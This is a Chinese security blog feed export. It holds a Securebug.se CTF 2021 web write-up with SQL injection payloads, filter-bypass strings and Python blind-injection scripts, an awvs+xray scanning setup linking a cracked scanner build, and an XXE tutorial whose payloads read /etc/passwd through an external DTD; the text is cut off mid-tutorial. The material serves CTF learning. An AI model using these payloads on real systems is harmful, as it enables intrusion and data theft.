<p><img src="https://img-blog.csdnimg.cn/20200713231814480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img"><img src="https://img-blog.csdnimg.cn/20200713231826222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/20200713231947606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70" alt="img"> </p>
<p> 这样就成功疗，SSRF的学习刚刚开始，开始记录一下</p>
]]></content>
      <categories>
        <category>share</category>
      </categories>
  </entry>
  <entry>
    <title>Securebug.se CTF Loki 2021</title>
    <url>/2021/07/22/Securebug-se-CTF-Loki-2021/</url>
    <content><![CDATA[<p>Securebug.se CTF Loki 2021 —web WriteUp</p>
<p>题目比较简单</p>
<a id="more"></a>

<h2 id="Simple-Login"><a href="#Simple-Login" class="headerlink" title="Simple Login"></a><strong>Simple Login</strong></h2><p>查看源码</p>
<img src="http://img.npfs06.top/20210722164243.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">



<h2 id="Doodle-Search"><a href="#Doodle-Search" class="headerlink" title="Doodle Search"></a><strong>Doodle Search</strong></h2><p>查看源码发现注释 </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;a href=&quot;?source&quot;&gt;sauce&lt;/a&gt; --&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问:  <a href="https://ch1.sbug.se/?source">https://ch1.sbug.se/?source</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>])) &#123;</span><br><span class="line">       </span><br><span class="line">       <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM websites WHERE title LIKE &#x27;%&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>].  <span class="string">&quot;%&#x27; OR description LIKE &#x27;%&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] .  <span class="string">&quot;%&#x27; OR link LIKE &#x27;%&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] . <span class="string">&quot;%&#x27;;&quot;</span>;</span><br><span class="line">       <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;query(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span>  <span class="string">&quot;&lt;h2&gt;search &#x27;&quot;</span>. htmlspecialchars(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]) . <span class="string">&quot;&#x27; : results &quot;</span> . <span class="variable">$result</span>-&gt;num_rows . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// output data of each row</span></span><br><span class="line">           <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;div&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;h2&gt;&quot;</span> . htmlspecialchars(<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&quot;&lt;/h2&gt;&lt;/a&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&quot;</span> . htmlspecialchars(<span class="variable">$row</span>[<span class="string">&#x27;link&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;h5 style=&#x27;color: #777;&#x27;&gt;&quot;</span> . htmlspecialchars(<span class="variable">$row</span>[<span class="string">&#x27;description&#x27;</span>]) . <span class="string">&quot;&lt;/h5&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;hr/&gt;&quot;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<blockquote>
<p>‘ union select 1,2,password from secrets#</p>
</blockquote>
<img src="http://img.npfs06.top/20210722163338.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">





<h2 id="Yummy-Cookie"><a href="#Yummy-Cookie" class="headerlink" title="Yummy Cookie"></a>Yummy Cookie</h2><p>页面提示</p>
<blockquote>
<p>Who let the robots out?</p>
</blockquote>
<p>访问： <a href="https://ch27.sbug.se/robots.txt">https://ch27.sbug.se/robots.txt</a></p>
<p>得到提示</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">User</span>-agent: *</span><br><span class="line"><span class="attribute">Disallow</span>: <span class="number">007469</span>e<span class="number">470</span>d.php</span><br></pre></td></tr></table></figure>
<p>访问： <a href="https://ch27.sbug.se/007469e470d.php">https://ch27.sbug.se/007469e470d.php</a></p>
<p>根据提示修改http头即可</p>
<img src="http://img.npfs06.top/20210722164822.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">



<h2 id="Inception"><a href="#Inception" class="headerlink" title="Inception"></a>Inception</h2><p>查看源码发现注释</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /?src --&gt;</span></span><br></pre></td></tr></table></figure>


<p>访问： <a href="https://ch24.sbug.se/?src">https://ch24.sbug.se/?src</a></p>
<p>得到提示</p>
<blockquote>
<p>preg_replace(“/select|union|from|where/i”, “”, @$_GET[“fname”]);</p>
</blockquote>
<p>双写绕过即可</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; uniounionn selecselectt  group_concat(table_name),<span class="number">2</span>,<span class="number">3</span> frofromm information_schema.tables whwhereere table_schema=database()#</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210722165827.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">



<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; uniounionn selecselectt  group_concat(column_name),<span class="number">2</span>,<span class="number">3</span> frofromm information_schema.columns whwhereere table_name=<span class="string">&quot;inception_users&quot;</span>#</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210722170006.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">



<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; ununionion selselectect group_concat(passwd),<span class="number">2</span>,<span class="number">3</span> frfromom inception_users#</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210722170252.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">



<h2 id="Unzipper"><a href="#Unzipper" class="headerlink" title="Unzipper"></a>Unzipper</h2><p>目录扫描，存在后台地址： <a href="https://ch26.sbug.se/admin.php">https://ch26.sbug.se/admin.php</a></p>
<p>弱密码  admin/admin  登入</p>
<p>根据提示，需要上传zip文件，想到软连接。[SWPU2019]Web3中有过类似的考点</p>
<p>不过这里的flag路径要写 <code>/flag</code>，不是<code>/etc/flag</code>s</p>
<img src="http://img.npfs06.top/20210722191145.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">



<img src="http://img.npfs06.top/20210722191116.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">



<h2 id="Ninja-Blog"><a href="#Ninja-Blog" class="headerlink" title="Ninja Blog"></a>Ninja Blog</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://ch2.sbug.se/login.php&#x27;</span></span><br><span class="line">s = string.digits + string.ascii_letters + string.punctuation</span><br><span class="line">print(s)</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> : <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> : <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">username_template = <span class="string">&quot;&#x27;admin&#x27;or/**/ascii(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1))=&#123;1&#125;#&quot;</span></span><br><span class="line"><span class="comment">#username_template = &quot;admin&#x27;or/**/ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;blog_v2&#x27;),&#123;0&#125;,1))=&#123;1&#125;#&quot;</span></span><br><span class="line"><span class="comment">#username_template = &quot;admin&#x27;or/**/ascii(substr((select username from  blog_v2 limit 2,1),&#123;0&#125;,1))=&#123;1&#125;#&quot;</span></span><br><span class="line">            </span><br><span class="line">st = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    st = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s :</span><br><span class="line">        asc = <span class="built_in">ord</span>(c)</span><br><span class="line">        payload[<span class="string">&#x27;username&#x27;</span>] = username_template.<span class="built_in">format</span>(i,asc)</span><br><span class="line">        response = requests.post(url, data=payload)</span><br><span class="line">        print(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in, but your role is not admin&quot;</span> <span class="keyword">in</span> response.text: </span><br><span class="line">            result += c</span><br><span class="line">            print(<span class="string">&#x27;tables: &#x27;</span>, result)</span><br><span class="line">            st = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> st == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">&#x27;tables: &#x27;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="comment">##jony</span></span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210722203158.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">

<img src="http://img.npfs06.top/20210722203214.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10" style="zoom:70%;">



<h2 id="blacklist"><a href="#blacklist" class="headerlink" title="blacklist"></a>blacklist</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;https://ch23.sbug.se/?fname=&quot;</span></span><br><span class="line">temp = &#123;&#125;</span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high =<span class="number">128</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (low&lt;high):</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;%26%26(&#123;&#125;&lt;ascii(substr((select(database())),&#123;&#125;,1)))%23&quot;.format(mid, i)     		  </span></span><br><span class="line">        <span class="comment">#payload=&quot;admin&#x27;%26%26if((ascii(substr((select(concat(table_name))from(information_schema.tables)where(table_schema=&#x27;test&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;),1,0)%23&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;%26%26if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&#x27;test&#x27;)and(table_name=&#x27;blacklist_users&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;),1,0)%23&quot;.format(i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;%26%26if((ascii(substr((select(group_concat(flag))from(blacklist_users)),&#123;&#125;,1))&gt;&#123;&#125;),1,0)%23&quot;</span>.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        temp = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;youtube&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid =(low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a +=<span class="built_in">chr</span>(mid)</span><br><span class="line">    print(a)</span><br><span class="line">print(<span class="string">&quot;password=&quot;</span>,a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>WEB学习路线</title>
    <url>/2021/07/11/WEB%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="623f660660b3e75757afd75dcdcfffe2d73590a2aa10c162801278a10ebf8c85"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>awvs+xray联动</title>
    <url>/2021/08/16/awvs-xray%E8%81%94%E5%8A%A8/</url>
    <content><![CDATA[<p>awvs 的爬虫很好用，支持表单分析和单页应用的爬取，xray 的扫描能力比较强，速度也更快。awvs 和 xray 搭配使用则是如虎添翼。这里演示的是扫描 awvs 的在线靶站 <a href="http://testphp.vulnweb.com/">http://testphp.vulnweb.com/</a></p>
<a id="more"></a>



<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>一台云服务器</p>
<h1 id="awvs"><a href="#awvs" class="headerlink" title="awvs"></a>awvs</h1><p>awvs我是用docker搭的，具体参见</p>
<p><a href="https://npfs06.top/2021/08/16/awvs14%E7%A0%B4%E8%A7%A3%E7%89%88docker%E4%B8%80%E9%94%AE%E5%AE%89%E8%A3%85/" target="_blank">awvs14破解版docker一键安装</a></p>
<h1 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h1><p>下载链接：<a href="https://github.com/chaitin/xray/releases/download/1.7.1/xray_linux_amd64.zip">https://github.com/chaitin/xray/releases/download/1.7.1/xray_linux_amd64.zip</a></p>
<p>下好之后，可能会运行不了，这是因为没给权限</p>
<blockquote>
<p>chmod +x xray_linux_amd64</p>
</blockquote>
<img src="http://img.npfs06.top/20210816164905.png" style="zoom:80%;">







<h1 id="awvs-xray"><a href="#awvs-xray" class="headerlink" title="awvs+xray"></a>awvs+xray</h1><p>看下ip地址</p>
<blockquote>
<p>ifconfig -a</p>
</blockquote>
<img src="http://img.npfs06.top/20210816165042.png" style="zoom:80%;">





<p>awvs 选好目标后，配置http代理</p>
<img src="http://img.npfs06.top/20210816165153.png" style="zoom:80%;">





<p>保存好，选crawl only 就可以开始扫描了</p>
<img src="http://img.npfs06.top/20210816165243.png" style="zoom:80%;">



<p>同时 xray要开启监听</p>
<blockquote>
<p>./xray_linux_amd64 webscan –listen 0.0.0.0:32701 –html-output awvs.html</p>
</blockquote>
<h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><img src="http://img.npfs06.top/20210816165413.png" style="zoom:80%;">





<p>扫描结束会生成如下文件</p>
<img src="http://img.npfs06.top/20210816165515.png" style="zoom:80%;">



<img src="http://img.npfs06.top/20210816165553.png" style="zoom:80%;">



]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>XXE注入攻击</title>
    <url>/2020/05/05/XXE%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>XXE注入攻击<a id="more"></a></p>
<h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-docx-file" target="_blank">XXE PAYLOADS</a></p>
<p><a href="https://www.runoob.com/xml/xml-tutorial.html" target="_blank">链接</a></p>
<h2 id="XML语法规则如下："><a href="#XML语法规则如下：" class="headerlink" title="XML语法规则如下："></a>XML语法规则如下：</h2><ol>
<li>所有的XML元素都必须有一个关闭标签</li>
<li>XML标签对大小写敏感</li>
<li>XML必须正确嵌套</li>
<li>XML属性值必须加引号</li>
<li>实体引用</li>
<li>在XML中，空格会被保留（案例如：&lt;p&gt;a空格B&lt;/p&gt;，这时候a和B之间的空格就会被保留）</li>
</ol>
<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><blockquote>
<p>XXE全称是XML External Entity,也就是XML<code>外部实体</code>注入攻击.漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
</blockquote>
<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><blockquote>
<p>DTD全称是The document type definition，即是文档类型定义，可定义合法的XML文档构建模块。<br>它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中(内部声明），也可作为一个外部引用。</p>
</blockquote>
<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p><code> &lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml <span class="built_in">version</span>=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;！DOCTYPE note[      <span class="comment"> //DTD</span></span><br><span class="line">&lt;！ELEMENT note（<span class="built_in">to</span>,<span class="built_in">from</span>,login）&gt;   <span class="comment"> //定义元素</span></span><br><span class="line">&lt;！ELEMENT <span class="built_in">to</span>（<span class="comment">#PCDATA）&gt;</span></span><br><span class="line">&lt;！ELEMENT <span class="built_in">from</span>（<span class="comment">#PCDATA）&gt;</span></span><br><span class="line">&lt;！ELEMENT login（<span class="comment">#PCDATA）&gt;</span></span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;<span class="built_in">to</span>&gt; tony &lt;/ <span class="built_in">to</span>&gt;</span><br><span class="line">&lt;<span class="built_in">from</span>&gt; anmi &lt;/ <span class="built_in">from</span>&gt;</span><br><span class="line">&lt;login&gt;<span class="number">123</span>&lt;/ login&gt;</span><br><span class="line">&lt;/ note&gt;</span><br></pre></td></tr></table></figure>


<h3 id="引用外部DTD"><a href="#引用外部DTD" class="headerlink" title="引用外部DTD:"></a>引用外部DTD:</h3><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code><br><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;</code></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是包含DTD的“ note.dtd”文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<p>  在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。</p>
<blockquote>
<p>参数实体(用%声明,用%引用。 DTD中声明,DTD中引用)<br>其余实体(直接用实体名称声明,使用&amp;引用。  DTD中声明,xml中引用)    </p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">内部实体:            </span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">&quot;实体内容&quot;</span>&gt;</span>    </span><br><span class="line"></span><br><span class="line">外部实体:</span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI&quot;</span>&gt;</span>        </span><br><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;public_ID&quot;</span> <span class="meta-string">&quot;URI&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">参数实体:</span><br><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-string">&quot;实体内容&quot;</span>&gt;</span>    </span><br></pre></td></tr></table></figure>
<h1 id="怎么判断网站是否存在XXE漏洞"><a href="#怎么判断网站是否存在XXE漏洞" class="headerlink" title="怎么判断网站是否存在XXE漏洞"></a>怎么判断网站是否存在XXE漏洞</h1><p>最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</p>
<h1 id="构造外部实体注入的方法"><a href="#构造外部实体注入的方法" class="headerlink" title="构造外部实体注入的方法"></a>构造外部实体注入的方法</h1><h2 id="直接通过DTD外部实体声明"><a href="#直接通过DTD外部实体声明" class="headerlink" title="直接通过DTD外部实体声明"></a>直接通过DTD外部实体声明</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">NPFS</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY  <span class="meta-keyword">npfs</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///home/ctf/flag.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">something</span>&gt;</span><span class="symbol">&amp;npfs;</span><span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="通过DTD文档引入外部DTD文档，再引入外部实体声明"><a href="#通过DTD文档引入外部DTD文档，再引入外部实体声明" class="headerlink" title="通过DTD文档引入外部DTD文档，再引入外部实体声明"></a>通过DTD文档引入外部DTD文档，再引入外部实体声明</h2><p>xml内容：</p>
<figure class="highlight mojolicious"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE a [</span></span></span><br><span class="line"><span class="xml">       <span class="meta">&lt;!ENTITY %d <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.123.com/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="perl">       %d;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">aaa</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">aaa</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>DTD文件(evil.dtd)内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="通过DTD外部实体声明引入外部实体声明"><a href="#通过DTD外部实体声明引入外部实体声明" class="headerlink" title="通过DTD外部实体声明引入外部实体声明"></a>通过DTD外部实体声明引入外部实体声明</h2><p>xml内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml verstion=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://www.123.com/evil.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>DTD文件(evil.dtd)内容</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>另外，不同程序支持的协议是不一样:</p>
<p><img src="https://img.npfs06.top/20210306103114.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>参数实体还能嵌套定义但是内层的参数实体的%需要进行HTML转义，否则会解析出错</p>
<p>就如下面一样:</p>
